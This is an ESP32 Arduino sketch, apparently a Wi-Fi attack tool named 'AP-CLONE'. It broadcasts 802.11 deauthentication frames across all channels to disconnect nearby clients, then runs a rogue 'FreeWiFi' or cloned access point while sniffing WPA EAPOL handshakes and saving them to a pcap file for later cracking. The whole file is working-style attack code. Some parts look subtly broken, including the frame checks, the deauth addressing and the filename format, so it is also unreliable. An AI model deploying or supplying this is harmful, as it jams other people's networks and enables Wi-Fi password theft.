#include <time.h>
#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include "FS.h"
#include "SD_MMC.h"
#include "soc/rtc_cntl_reg.h"
#include "soc/soc.h"
#include <set>

#define LED_PIN 33
#define DEAUTH_DURATION 15000  // 15 seconds deauthing
#define CAPTURE_DURATION 30000 // 30 seconds capture

uint8_t targetBSSID[6];
char targetSSID[33] = {0};
bool targetSet = false;
bool handshakeComplete = false;
uint8_t stage = 0;  // 0=scanning, 1=deauthing, 2=capturing

std::set<String> seenHandshakes;
File pcapFile;
String pcapFilename;

void initPcapHeader() {
    char filename[64];
    sprintf(filename, "%s", pcapFilename.c_str());
    pcapFile = SD_MMC.open(filename, FILE_WRITE);
    if (pcapFile) {
        uint32_t magic = 0xa1b2c3d4;
        uint16_t version_major = 2;
        uint16_t version_minor = 4;
        int32_t thiszone = 0;
        uint32_t sigfigs = 0;
        uint32_t snaplen = 65535;
        uint32_t network = 105;
        pcapFile.write((uint8_t*)&magic, 4);
        pcapFile.write((uint8_t*)&version_major, 2);
        pcapFile.write((uint8_t*)&version_minor, 2);
        pcapFile.write((uint8_t*)&thiszone, 4);
        pcapFile.write((uint8_t*)&sigfigs, 4);
        pcapFile.write((uint8_t*)&snaplen, 4);
        pcapFile.write((uint8_t*)&network, 4);
        pcapFile.close();
    }
}

void writePcapPacket(const uint8_t* payload, uint16_t len) {
    char filename[64];
    sprintf(filename, "%s", pcapFilename.c_str());
    pcapFile = SD_MMC.open(filename, FILE_APPEND);
    if (!pcapFile) return;
    uint32_t ts_sec = micros() / 1000000;
    uint32_t ts_usec = micros() % 1000000;
    uint32_t incl_len = len;
    uint32_t orig_len = len;
    pcapFile.write((uint8_t*)&ts_sec, 4);
    pcapFile.write((uint8_t*)&ts_usec, 4);
    pcapFile.write((uint8_t*)&incl_len, 4);
    pcapFile.write((uint8_t*)&orig_len, 4);
    pcapFile.write(payload, len);
    pcapFile.close();
}

bool isEAPOL(uint8_t* payload) {
    if (payload[12] == 0xAA && payload[13] == 0xAA && 
        payload[14] == 0x03 && payload[24] == 0x88) {
        return true;
    }
    return false;
}

void sendDeauth(uint8_t* bssid, uint8_t* client) {
    uint8_t deauthPkt[26] = {
        0xc0, 0x00, 0x3a, 0x01,
        client[0], client[1], client[2], client[3], client[4], client[5],
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        0x00, 0x00, 0x01, 0x00
    };
    for (int i = 0; i < 10; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauthPkt, sizeof(deauthPkt), false);
        delay(2);
    }
}

void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (stage != 2 || handshakeComplete) return;

    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* payload = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;

    if (type == WIFI_PKT_MGMT && isEAPOL(payload)) {
        uint8_t* bssid = &payload[10];
        if (memcmp(bssid, targetBSSID, 6) != 0) return;

        uint8_t msgNum = 0;
        uint16_t keyInfo = (payload[25] << 8) | payload[24];
        if (keyInfo & 0x0001) msgNum = 1;
        else if (keyInfo & 0x0002) msgNum = 2;
        else if (keyInfo & 0x0004) msgNum = 3;
        else if (keyInfo & 0x0008) msgNum = 4;

        if (msgNum > 0) {
            char key[18];
            sprintf(key, "%02X%02X%02X%02X%02X%02X-Msg%d",
                    targetBSSID[0], targetBSSID[1], targetBSSID[2],
                    targetBSSID[3], targetBSSID[4], targetBSSID[5], msgNum);

            if (seenHandshakes.find(String(key)) == seenHandshakes.end()) {
                seenHandshakes.insert(String(key));
                writePcapPacket(payload, len);
                digitalWrite(LED_PIN, LOW);
                delay(50);
                digitalWrite(LED_PIN, HIGH);
                Serial.printf("[HANDSHAKE] Msg%d captured\n", msgNum);

                if (seenHandshakes.size() >= 4) {
                    handshakeComplete = true;
                    Serial.println("[!] COMPLETE HANDSHAKE CAPTURED");
                }
            }
        }
    }
}

void setup() {
    WRITE_PERI_REG(RTC_CNTL_BROWN_OUT_REG, 0);
    pinMode(LED_PIN, OUTPUT);
    digitalWrite(LED_PIN, HIGH);

    Serial.begin(115200);
    delay(1000);
    Serial.println("\n[AP-CLONE] Starting...");
    Serial.flush();

    if (!SD_MMC.begin("/sdcard", true)) {
        Serial.println("[SD] Init FAILED");
    } else {
        Serial.println("[SD] Init OK");
        time_t now = time(nullptr);
        struct tm* ti = localtime(&now);
        char fname[64];
        snprintf(fname, sizeof(fname), "/handshake/%%04d%%02d%%02d-%%02d%%02d%%02d.pcap",
                 ti->tm_year + 1900, ti->tm_mon + 1, ti->tm_mday,
                 ti->tm_hour, ti->tm_min, ti->tm_sec);
        pcapFilename = String(fname);
        SD_MMC.mkdir("/handshake");
    }

    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&sniffer_callback);
    Serial.println("[WiFi] Sniffer mode enabled");

    // Scan for networks
    Serial.println("[SCAN] Starting network scan...");
    int channel = 1;
    uint32_t scanStart = millis();
    std::set<String> foundSSIDs;
    
    while (millis() - scanStart < 15000) {
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        delay(100);
        channel = (channel % 13) + 1;
    }

    Serial.println("[SCAN] Scan complete. Starting attack mode...");
}

void loop() {
    uint32_t now = millis();
    static uint32_t stageStart = 0;
    static uint8_t ch = 1;
    static bool apStarted = false;

    // Auto-select first detected network as target for demo
    if (stage == 0 && now > 5000 && !targetSet) {
        // Demo: use a default target or wait for user input
        // For simplicity, attack first channel AP
        stage = 1;
        stageStart = now;
        Serial.println("[STAGE 1] Deauth attack starting...");
        
        // Set demo target (in real use, would scan and pick)
        // Using broadcast to attack all
    }

    if (stage == 1) {
        // Stage 1: Deauth
        if (stageStart == 0) stageStart = now;
        
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        
        uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        uint8_t zero[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
        
        if (now % 100 < 50) {
            sendDeauth(broadcast, zero);
        }
        
        if (now % 5000 < 100) {
            ch = (ch % 13) + 1;
            Serial.printf("[DEAUTH] Channel %d\n", ch);
        }
        
        if (now - stageStart > DEAUTH_DURATION) {
            stage = 2;
            stageStart = now;
            ch = 1;
            apStarted = false;
            Serial.println("[STAGE 2] Starting fake AP...");
        }
        
    } else if (stage == 2) {
        // Stage 2: Fake AP + Capture
        if (!apStarted) {
            WiFi.softAP(targetSSID[0] ? targetSSID : "FreeWiFi", "12345678");
            Serial.println("[AP] Fake AP started");
            Serial.printf("[AP] SSID: %s\n", targetSSID[0] ? targetSSID : "FreeWiFi");
            Serial.print("[AP] IP: ");
            Serial.println(WiFi.softAPIP());
            apStarted = true;
            initPcapHeader();
        }
        
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        
        if (now % 3000 < 100) {
            ch = (ch % 13) + 1;
        }
        
        if (handshakeComplete || (now - stageStart > CAPTURE_DURATION)) {
            Serial.println("[DONE] Capture complete");
            while(1) delay(1000);
        }
    }
    
    delay(10);
}
